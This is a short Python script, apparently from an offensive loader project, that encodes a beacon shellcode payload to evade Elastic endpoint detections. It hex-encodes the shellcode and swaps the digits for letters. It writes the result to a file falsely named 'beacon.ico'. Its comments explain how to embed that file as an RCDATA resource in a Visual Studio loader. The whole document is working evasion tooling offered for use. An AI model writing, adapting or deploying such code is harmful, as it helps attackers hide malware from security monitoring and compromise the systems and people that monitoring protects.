# encode beacon shellcode file to bypass elastic detections
# encoding method: convert bytes to hex -> reeplace numbers with letters
# resource size = original payload size * 2

# after running this, replace loader.rc with beacon.ico resource
#   1. delete loader.rc
#   2. right-click Resource Files -> Add -> Resource...
#   3. Import -> select beacon.ico
#   4. set type to RCDATA

input_file = "http_x64.xprocess.bin"    # input beacon shellcode file
output_file = "beacon.ico"              # output resource file (not actually a valid ico)

with open(input_file, 'rb') as f:
    binary = f.read()

hx = binary.hex()
hx = hx.translate(str.maketrans("0123456789", "ghijklmnop"))

with open(output_file, 'w') as f:
    f.write(hx)